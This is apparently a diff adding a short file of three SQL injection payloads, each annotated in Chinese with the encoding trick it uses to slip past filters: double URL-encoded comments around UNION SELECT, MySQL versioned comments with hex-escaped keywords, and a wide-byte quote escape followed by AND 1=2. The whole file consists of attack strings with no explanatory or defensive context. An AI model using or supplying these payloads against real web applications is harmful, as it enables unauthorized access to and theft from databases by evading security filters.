@@ -1,0 +1,8 @@
+（1）
+id=1%252f%252a*/UNION%252f%252a /SELECT  #url编码
+
+（2）id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4  #hex编码
+
+（3）10%D6‘%20AND%201=2%23　  #unicode编码
+
+
